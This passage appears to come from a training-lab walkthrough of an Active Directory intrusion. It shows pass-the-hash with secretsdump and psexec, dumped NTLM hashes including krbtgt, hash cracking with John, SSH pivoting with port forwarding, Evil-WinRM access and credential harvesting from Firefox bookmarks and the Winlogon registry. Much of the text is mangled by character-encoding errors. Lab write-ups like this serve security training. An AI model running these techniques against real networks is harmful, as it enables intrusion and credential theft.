class="hljs-number">2428483480</span>âˆ’<span class="hljs-number">107650130</span>âˆ’<span class="hljs-number">1107</span>â€²&#125;<br></code></pre></div></td></tr></table></figure>

<p>It comes out that â€˜<strong>forest_user</strong>â€˜ is added to local administrators of the â€˜<strong>mgmt.corp</strong>â€˜ domain.</p>
<p>Now, we need to extract the credentials of â€˜<strong>forest_user</strong>â€˜ and then we will perform PTH to the â€œ<strong>mgmt.corp</strong>â€œ domain.</p>
<figure class="highlight gherkin"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gherkin">Run secretsdump against mgmt.corp domain:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ ğ‘’ğ‘ğ‘Ÿğ‘’ğ‘¡ğ‘ ğ‘‘ğ‘¢ğ‘šğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.1.3 ğ‘’ğ‘™ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›<span class="hljs-meta">@ğ¸ğ¿ğ‘†âˆ’ğ·ğ¶</span> âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:8645ğ‘’87ğ‘’2593507ğ‘ğ‘“623ğ‘“3291ğ‘1334ğ‘2<br><br><span class="hljs-variable">&lt;Result&gt;</span><br>ğ‘’ğ‘™ğ‘ .ğ‘ğ‘œğ‘Ÿğ‘\ğ‘“ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡_ğ‘¢ğ‘ ğ‘’ğ‘Ÿ:1107:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:ğ‘7001ğ‘2ğ‘‘ğ‘ğ‘’0ğ‘“ğ‘ğ‘‘ğ‘ğ‘‘62ğ‘’ğ‘’4ğ‘3ğ‘ğ‘‘ğ‘’2410ğ‘9<br><span class="hljs-variable">&lt;/Result&gt;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image38.png" srcset="/img/loading.gif"></p>
<p>Credentials ofÂ <strong>â€œforest_userâ€</strong>Â are extracted as follows:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image39.png" srcset="/img/loading.gif"></p>
<p>We will now perform psexec against the â€˜<strong>mgmt-DC</strong>â€˜ server. The IP address ofÂ <strong>mgmt.corp</strong>Â domain can be enumerated using a simple DNS query (i.e nslookupÂ <strong>mgmt.corp</strong>).</p>
<ol>
<li> <strong>MGMT-DC Server</strong></li>
</ol>
<p>Using â€œ<strong>forest_userâ€</strong>Â we can establish a persistent connection using impacketâ€™s psexec script since it is a member of local administrators in theÂ <strong>mgmt.corp</strong>Â domain.</p>
<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">Psexec <span class="hljs-keyword">as</span> â€˜forest_userâ€™ <span class="hljs-keyword">on</span> â€˜mgmt.corpâ€™ domain:<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ğ‘¦ğ‘¡â„ğ‘œğ‘› ğ‘ğ‘ ğ‘’ğ‘¥ğ‘’ğ‘.ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.2</span> ğ‘“ğ‘œğ‘Ÿğ‘’ğ‘ ğ‘¡_ğ‘¢ğ‘ ğ‘’ğ‘Ÿ@ğ‘€ğºğ‘€ğ‘‡âˆ’ğ·ğ¶ âˆ’â„ğ‘ğ‘ â„ğ‘’ğ‘  ğ‘ğ‘ğ‘‘<span class="hljs-number">3</span>ğ‘<span class="hljs-number">435</span>ğ‘<span class="hljs-number">51404</span>ğ‘’ğ‘’ğ‘ğ‘ğ‘‘<span class="hljs-number">3</span>ğ‘<span class="hljs-number">435</span>ğ‘<span class="hljs-number">51404</span>ğ‘’ğ‘’:ğ‘<span class="hljs-number">7001</span>ğ‘<span class="hljs-number">2</span>ğ‘‘ğ‘ğ‘’<span class="hljs-number">0</span>ğ‘“ğ‘ğ‘‘ğ‘ğ‘‘<span class="hljs-number">62</span>ğ‘’ğ‘’<span class="hljs-number">4</span>ğ‘<span class="hljs-number">3</span>ğ‘ğ‘‘ğ‘’<span class="hljs-number">2410</span>ğ‘<span class="hljs-number">9</span><br><br>Switch <span class="hljs-keyword">to</span> PowerShell<br></code></pre></div></td></tr></table></figure>

<p>You will see something similar to the below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image40.png" srcset="/img/loading.gif"></p>
<p>We will also use the Active Directory Module present in the server to list any OU present in the MGMT-DC and all the members present in the available OUâ€™s.</p>
<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">LIST <span class="hljs-keyword">all</span> OUâ€™s in MGMT.CORP<br>ğ¼ğ‘šğ‘ğ‘œğ‘Ÿğ‘¡âˆ’ğ‘€ğ‘œğ‘‘ğ‘¢ğ‘™ğ‘’ ğ´ğ‘ğ‘¡ğ‘–ğ‘£ğ‘’ğ·ğ‘–ğ‘Ÿğ‘’ğ‘ğ‘¡ğ‘œğ‘Ÿğ‘¦<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ &#123;ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ğ¶ğ‘™ğ‘ğ‘ ğ‘  âˆ’ğ‘’ğ‘ â€˜ğ‘œğ‘Ÿğ‘”ğ‘ğ‘›ğ‘–ğ‘§ğ‘ğ‘¡ğ‘–ğ‘œğ‘›ğ‘ğ‘™ğ‘¢ğ‘›ğ‘–ğ‘¡â€™&#125; âˆ’ğ‘ƒğ‘Ÿğ‘œğ‘ğ‘’ğ‘Ÿğ‘¡ğ‘–ğ‘’ğ‘  ğ¶ğ‘ğ‘›ğ‘œğ‘›ğ‘–ğ‘ğ‘ğ‘™ğ‘ğ‘ğ‘šğ‘’ | ğ‘†ğ‘’ğ‘™ğ‘’ğ‘ğ‘¡âˆ’ğ‘‚ğ‘ğ‘—ğ‘’ğ‘ğ‘¡ ğ·ğ‘–ğ‘ ğ‘¡ğ‘–ğ‘›ğ‘”ğ‘¢ğ‘–ğ‘ â„ğ‘’ğ‘‘ğ‘ğ‘ğ‘šğ‘’<br><br>Get Members of â€œBastion-Hostâ€ OU<br><span class="hljs-symbol">$</span>ğ‘œğ‘¢ğ‘ğ‘ğ‘¡â„ = â€œğ‘‚ğ‘ˆ=ğµğ‘ğ‘ ğ‘¡ğ‘–ğ‘œğ‘›âˆ’ğ»ğ‘œğ‘ ğ‘¡,ğ·ğ¶=ğ‘šğ‘”ğ‘šğ‘¡,ğ·ğ¶=ğ‘ğ‘œğ‘Ÿğ‘â€<br>ğºğ‘’ğ‘¡âˆ’ğ´ğ·ğ‘ˆğ‘ ğ‘’ğ‘Ÿ âˆ’ğ¹ğ‘–ğ‘™ğ‘¡ğ‘’ğ‘Ÿ âˆ— âˆ’ğ‘†ğ‘’ğ‘ğ‘Ÿğ‘â„ğµğ‘ğ‘ ğ‘’ <span class="hljs-symbol">$</span>ğ‘œğ‘¢ğ‘ğ‘ğ‘¡â„<br>(ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› ğ‘¢ğ‘ ğ‘’ğ‘Ÿ ğ‘‘ğ‘–ğ‘ ğ‘ğ‘œğ‘£ğ‘’ğ‘Ÿğ‘’ğ‘‘ )<br></code></pre></div></td></tr></table></figure>

<p>The Domain user â€œ<strong>Jump-Admin</strong>â€œ present in the â€œ<strong>Bastion-Host</strong>â€œ OU can be useful in moving forward from the MGMT-DC server. The IP address of â€œ<strong>jump-srvâ€</strong>Â server can be enumerated by actively querying the DNS record.</p>
<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">ğ‘›ğ‘ ğ‘™ğ‘œğ‘œğ‘˜ğ‘¢ğ‘ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ ğ‘Ÿğ‘£<br><br><span class="hljs-params">&lt;..SNIP..&gt;</span><br><span class="hljs-symbol">Name:</span> jump-srv.mgmt.corp<br>IP Address: <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span><br><span class="hljs-params">&lt;../SNIP..&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>However, we will extract all the credentials present in the MGMT.CORP domain leveraging impacketâ€™sÂ <strong><em>sercretsdump.py</em></strong>Â script.</p>
<p>On a new bash prompt using our route to internal network [10.10.3.0/24], we will execute secretsdump.py as follows:</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘’ğ‘ğ‘Ÿğ‘’ğ‘¡ğ‘ ğ‘‘ğ‘¢ğ‘šğ‘. ğ‘ğ‘¦ âˆ’ğ‘‘ğ‘’ğ‘ğ‘¢ğ‘” âˆ’ğ‘‘ğ‘âˆ’ğ‘–ğ‘ 10.10.3.2 ğ‘ ğ‘ğ‘›_ğ‘ ğ‘£ğ‘@ğ‘€ğºğ‘€ğ‘‡âˆ’ğ·ğ¶.ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ<br><br><span class="hljs-meta">[..SNIP..]</span><br><span class="hljs-bullet">ğ’ğ’ˆğ’ğ’•âˆ’ğ’‚ğ’…ğ’ğ’Šğ’:500:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:86ğ‘64ğ‘256ğ‘’8ğ‘ğ‘’ğ‘2ğ‘’ğ‘‘ğ‘“31ğ‘4157ğ‘ğ‘“6ğ‘ğ‘’ğ‘ğ‘:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">ğ’Œğ’“ğ’ƒğ’•ğ’ˆğ’•:502:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:2ğ‘7ğ‘0ğ‘“537983ğ‘ğ‘ğ‘4120725ğ‘‘055ğ‘“ğ‘ğ‘ğ‘ğ‘9:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">ğ’ğ’ˆğ’ğ’•.ğ’„ğ’ğ’“ğ’‘\ğ’‹ğ’–ğ’ğ’‘âˆ’ğ’‚ğ’…ğ’ğ’Šğ’:1104:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:ğŸğ’…ğ’„ğŸ—ğ’ƒğ’‡ğ’‡ğŸ‘ğŸ—ğŸ•ğ’‡ğŸ—ğ’†ğŸ”ğ’„ğŸ—ğ’‡ğŸğŸ–ğ’‚ğŸğŸ“ğ’ƒğŸğŸ–ğŸğŸ’ğŸ“ğ’‚ğŸ•ğ’ƒğŸ”:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">ğ’ğ’ˆğ’ğ’•.ğ’„ğ’ğ’“ğ’‘\ğ’”ğ’‘ğ’_ğ’”ğ’—ğ’„:1106:ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’ğ‘ğ‘ğ‘‘3ğ‘435ğ‘51404ğ‘’ğ‘’:2ğ‘‘ğ‘9ğ‘ğ‘“ğ‘“397ğ‘“9ğ‘’6ğ‘9ğ‘“08ğ‘05ğ‘18145ğ‘7ğ‘6:::</span><br><span class="hljs-bullet"></span><span class="hljs-meta">[..SNIP..]</span><br></code></pre></div></td></tr></table></figure>

<p>Crack the â€œ<strong>jump-admin</strong>â€œ hash using JTR [John] by storing the NT hash in a file.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">â†’ Crack jump-admin hash(<span class="hljs-number">2</span>dc9bff397f9e6c9f08a05b18145a7b6):<br><br><span class="hljs-keyword">Copy</span> the hash â€œ<span class="hljs-number">2</span>dc9bff397f9e6c9f08a05b18145a7b6â€ in jump-adminpass.txt <span class="hljs-keyword">file</span><br><br>ğ‘—ğ‘œâ„ğ‘› âˆ’âˆ’ğ‘“ğ‘œğ‘Ÿğ‘šğ‘ğ‘¡=ğ‘ğ‘‡ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›ğ‘ğ‘ğ‘ ğ‘ .ğ‘¡ğ‘¥ğ‘¡ âˆ’ğ‘¤=<span class="hljs-regexp">/ğ‘¢ğ‘ ğ‘Ÿ/</span>ğ‘ â„ğ‘ğ‘Ÿğ‘’<span class="hljs-regexp">/ğ‘¤ğ‘œğ‘Ÿğ‘‘ğ‘™ğ‘–ğ‘ ğ‘¡ğ‘ /</span>ğ‘Ÿğ‘œğ‘ğ‘˜ğ‘¦ğ‘œğ‘¢.ğ‘¡ğ‘¥ğ‘¡<br></code></pre></div></td></tr></table></figure>

<p>The hash is cracked and we now have clear text credentials of the â€œ<strong>jump-admin</strong>â€œ user at theÂ <strong>â€œJump-Adminâ€</strong>Â machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image41.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>Jump-Srv</strong></li>
</ol>
<p>Letâ€™s perform a TCP port scan against the target 10.10.3.3 [<strong>jump-srv.mgmt.corp</strong>] using nmap and leveraging the route to the 10.10.3.0/24 network.</p>
<figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf">With meterpreter active <span class="hljs-keyword">route</span> <span class="hljs-keyword">to</span> â€œ<span class="hljs-number">10.10</span>.<span class="hljs-number">3.0</span>/<span class="hljs-number">24</span>â€ network &amp; <span class="hljs-keyword">on</span> new bash shell<br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘›ğ‘šğ‘ğ‘ âˆ’âˆ’ğ‘¡ğ‘œğ‘âˆ’ğ‘ğ‘œğ‘Ÿğ‘¡ğ‘  <span class="hljs-number">10</span> âˆ’ğ‘ ğ‘‡ âˆ’ğ‘ ğ‘‰ âˆ’ğ‘ƒğ‘› <span class="hljs-number">10.10</span>.<span class="hljs-number">3.3</span><br><br><span class="hljs-variable">&lt;..SNIP..&gt;</span><br>ğ‘ğ‘šğ‘ğ‘ ğ‘ ğ‘ğ‘ğ‘› ğ‘Ÿğ‘’ğ‘ğ‘œğ‘Ÿğ‘¡ ğ‘“ğ‘œğ‘Ÿ <span class="hljs-number">10.10</span>.<span class="hljs-number">3.3</span><br>ğ»ğ‘œğ‘ ğ‘¡ ğ‘–ğ‘  ğ‘¢ğ‘ (<span class="hljs-number">2.4</span>ğ‘  ğ‘™ğ‘ğ‘¡ğ‘’ğ‘›ğ‘ğ‘¦).<br>ğ‘ƒğ‘‚ğ‘…ğ‘‡ ğ‘†ğ‘‡ğ´ğ‘‡ğ¸ ğ‘†ğ¸ğ‘…ğ‘‰ğ¼ğ¶ğ¸ ğ‘‰ğ¸ğ‘…ğ‘†ğ¼ğ‘‚ğ‘<br><span class="hljs-number">21</span>/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘“ğ‘¡ğ‘<br>ğŸğŸ/ğ’•ğ’„ğ’‘ ğ’ğ’‘ğ’†ğ’ ğ’”ğ’”ğ’‰ ğ‘¶ğ’‘ğ’†ğ’ğ‘ºğ‘ºğ‘¯ ğŸ•.ğŸğ’‘ğŸ ğ‘¼ğ’ƒğ’–ğ’ğ’•ğ’– ğŸ’ğ’–ğ’ƒğ’–ğ’ğ’•ğ’–ğŸ.ğŸ– (ğ‘¼ğ’ƒğ’–ğ’ğ’•ğ’– ğ‘³ğ’Šğ’ğ’–ğ’™;ğ’‘ğ’“ğ’ğ’•ğ’ğ’„ğ’ğ’ ğŸ.ğŸ)<br><span class="hljs-number">23</span>/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘¡ğ‘’ğ‘™ğ‘›ğ‘’ğ‘¡<br><span class="hljs-number">25</span>/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘ ğ‘šğ‘¡ğ‘<br><span class="hljs-number">80</span>/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ â„ğ‘¡ğ‘¡ğ‘<br><span class="hljs-number">110</span>/ğ‘¡ğ‘ğ‘ ğ‘ğ‘™ğ‘œğ‘ ğ‘’ğ‘‘ ğ‘ğ‘œğ‘<span class="hljs-number">3</span><br><span class="hljs-variable">&lt;..SNIP..&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>SSH server is running on TCP port 22. As â€˜<strong>jump-srv.mgmt.corp</strong>â€˜ machine is managed by â€œ<strong>jump-admin</strong>â€œ, we can try to do SSH to â€˜<strong>10.10.3.3</strong>â€˜ machine using Jump-Admin Domain user.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Perform</span> SSH <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span> <span class="hljs-keyword">as</span> jump-<span class="hljs-keyword">admin</span> <span class="hljs-keyword">domain</span> <span class="hljs-keyword">user</span>.<br><br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘ â„ âˆ’ğ‘™ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span><br>NOTE: enter jump-<span class="hljs-keyword">admin</span> cracked <span class="hljs-keyword">password</span> â€˜B@DB!tchâ€™<br></code></pre></div></td></tr></table></figure>

<p>We successfully SSHed to Jump-SRV.mgmt.corp as the â€œ<strong>jump-admin</strong>â€œ domain user.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image42.png" srcset="/img/loading.gif"></p>
<p>Letâ€™s also extract the bookmark URLs of Firefox in this machine and look if any interesting information can</p>
<p>be found (as jump-admin user).</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">As â€˜Jump-adminâ€™ domain user<br>ğ‘ğ‘‘ <span class="hljs-regexp">/.ğ‘šğ‘œğ‘§ğ‘–ğ‘™ğ‘™ğ‘/</span>ğ‘“ğ‘–ğ‘Ÿğ‘’ğ‘“ğ‘œğ‘¥/<span class="hljs-number">2</span>ğ‘ <span class="hljs-number">3</span>ğ‘<span class="hljs-number">6</span>ğ‘š<span class="hljs-number">1</span>ğ‘£.ğ‘‘ğ‘’ğ‘“ğ‘ğ‘¢ğ‘™ğ‘¡âˆ’ğ‘Ÿğ‘’ğ‘™ğ‘’ğ‘ğ‘ ğ‘’<br>ğ‘ ğ‘ğ‘™ğ‘–ğ‘¡ğ‘’<span class="hljs-number">3</span> ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ .ğ‘ ğ‘ğ‘™ğ‘–ğ‘¡ğ‘’<br><br>Inside SQLite<br>.ğ‘¡ğ‘ğ‘ğ‘™ğ‘’ğ‘ <br>ğ‘ ğ‘’ğ‘™ğ‘’ğ‘ğ‘¡ ğ‘šğ‘œğ‘§_ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ .ğ‘¢ğ‘Ÿğ‘™ ğ‘“ğ‘Ÿğ‘œğ‘š ğ‘šğ‘œğ‘§_ğ‘ğ‘™ğ‘ğ‘ğ‘’ğ‘ ;<br>.ğ‘ğ‘¢ğ‘–ğ‘¡<br><br>ğ‘“ğ‘œğ‘¢ğ‘›ğ‘‘ ğ‘ˆğ‘…ğ¿: ğ’‰ğ’•ğ’•ğ’‘ğ’”:<span class="hljs-regexp">//</span>ğ’‚ğ’…ğ’ğ’Šğ’âˆ’ğ’”ğ’šğ’”.ğ’”ğ’Šğ’•ğ’†/ğ’ğ’ğ’ˆğ’Šğ’.ğ’‚ğ’”ğ’‘?ğ’–ğ’”ğ’†ğ’“=ğ’”ğ’šğ’”âˆ’ğ’‚ğ’…ğ’ğ’Šğ’&amp;ğ’‘ğ’‚ğ’”ğ’”=ğ‘¹ğ’‚ğ’ğ’…ğŸğ’ğ’ğ’šğ‘ºğŸ‘ğ’ğŸ‘ğ’„ğ’•ğ’†ğ’…ğ‘·@ğ’”ğ’”<br></code></pre></div></td></tr></table></figure>

<p>However, using firefox with proxychains querying the login URL, shows that it is non-existent, Now enumerate the IP address ofÂ <strong>admin-sys</strong>Â server by pinging the URL.</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">ğ‘ğ‘–ğ‘›ğ‘” ğ‘ğ‘‘ğ‘šğ‘–ğ‘›âˆ’ğ‘ ğ‘¦ğ‘ .ğ‘ ğ‘–ğ‘¡ğ‘’<br>Discovered IP <span class="hljs-selector-tag">address</span> <span class="hljs-selector-attr">[192.168.1.2]</span><br></code></pre></div></td></tr></table></figure>

<p>Performing TCP port scan on the target â€œ<strong>192.168.1.2</strong>â€œ reveals that the 5985 port is open, which means one can always do PowerShell Remoting.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image43.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>Admin-SYS</strong></li>
</ol>
<p>In order to perform PowerShell Remoting, we need to apply some port forwarding techniques.</p>
<p>Exit the SSH session and re-establish a new session with port forwarding switches.</p>
<p>Using port forwarding, we are specifying that all the traffic sent locally will be forwarded to the â€˜<strong>admin-sys</strong>â€˜ server [192.168.1.2]</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">On</span> a <span class="hljs-built_in">new</span> bash <span class="hljs-keyword">session</span><br>ğ‘ğ‘Ÿğ‘œğ‘¥ğ‘¦ğ‘â„ğ‘ğ‘–ğ‘›ğ‘  ğ‘ ğ‘ â„ âˆ’ğ‘™ ğ‘—ğ‘¢ğ‘šğ‘âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘›@ğ‘€ğºğ‘€ğ‘‡.ğ¶ğ‘‚ğ‘…ğ‘ƒ <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span> âˆ’ğ¿ <span class="hljs-number">5985</span>:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>:<span class="hljs-number">5985</span><br>(Now at this very particular <span class="hljs-type">point</span>, traffic <span class="hljs-keyword">from</span> your attacker machine can reach the <span class="hljs-keyword">admin</span>-sys machine)<br><br>Use Evil-WinRM <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> machine <span class="hljs-keyword">with</span> the discovered credentials<br>./ğ‘’ğ‘£ğ‘–ğ‘™âˆ’ğ‘¤ğ‘–ğ‘›ğ‘Ÿğ‘š.ğ‘Ÿğ‘ âˆ’ğ‘– <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> âˆ’ğ‘¢ ğ‘ ğ‘¦ğ‘ âˆ’ğ‘ğ‘‘ğ‘šğ‘–ğ‘› âˆ’ğ‘ ğ‘…ğ‘ğ‘›ğ‘‘<span class="hljs-number">0</span>ğ‘šğ‘™ğ‘¦ğ‘†<span class="hljs-number">3</span>ğ‘™<span class="hljs-number">3</span>ğ‘ğ‘¡ğ‘’ğ‘‘ğ‘ƒ@ğ‘ ğ‘ <br></code></pre></div></td></tr></table></figure>

<p>Enumerating the environment reveals that â€œ<strong>sys-adminâ€</strong>Â is a local user at the admin-sys server. Privilege escalation can be done by querying the autologin registry.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image44.png" srcset="/img/loading.gif"></p>
<p>Clear Text credentials of Administrator are found.</p>
<figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe">On the recently established WinRM session<br>ğ‘Ÿğ‘’ğ‘” ğ‘ğ‘¢ğ‘’ğ‘Ÿğ‘¦ <span class="hljs-string">&quot;ğ»ğ¾ğ¿ğ‘€\ğ‘†ğ‘‚ğ¹ğ‘‡ğ‘Šğ´ğ‘…ğ¸\ğ‘€ğ‘–ğ‘ğ‘Ÿğ‘œğ‘ ğ‘œğ‘“ğ‘¡\ğ‘Šğ‘–ğ‘›ğ‘‘ğ‘œğ‘¤ğ‘  ğ‘ğ‘‡\ğ¶ğ‘¢ğ‘Ÿğ‘Ÿğ‘’ğ‘›ğ‘¡ğ‘£ğ‘’ğ‘Ÿğ‘ ğ‘–ğ‘œğ‘›\ğ‘Šğ‘–ğ‘›ğ‘™ğ‘œğ‘”ğ‘œğ‘›&quot;</span><br><br>&lt;..SNIP..&gt;<br>ğ»ğ¾ğ¸ğ‘Œ<span class="hljs-literal">_</span>ğ¿ğ‘‚ğ¶ğ´ğ¿<span class="hljs-literal">_</span>ğ‘€ğ´ğ¶ğ»ğ¼ğ‘ğ¸\ğ‘†ğ‘‚ğ¹ğ‘‡ğ‘Šğ´ğ‘…ğ¸\ğ‘€ğ‘–ğ‘ğ‘Ÿğ‘œğ‘ 